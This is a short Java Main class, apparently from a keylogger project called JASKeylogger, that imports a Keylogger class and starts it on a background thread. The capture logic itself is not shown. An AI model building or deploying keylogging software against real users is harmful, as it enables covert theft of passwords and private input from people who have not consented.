
import br.com.juliansantos.JASKeylogger.keylogger.Keylogger;

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author Julian Santos
 */
public class Main {

    /**
     * @param args the command line arguments
     * @throws java.lang.InterruptedException
     */
    public static void main(String[] args) throws InterruptedException {

        Thread tKeylogger = new Thread(null, new Keylogger());
        tKeylogger.start();

    }

}
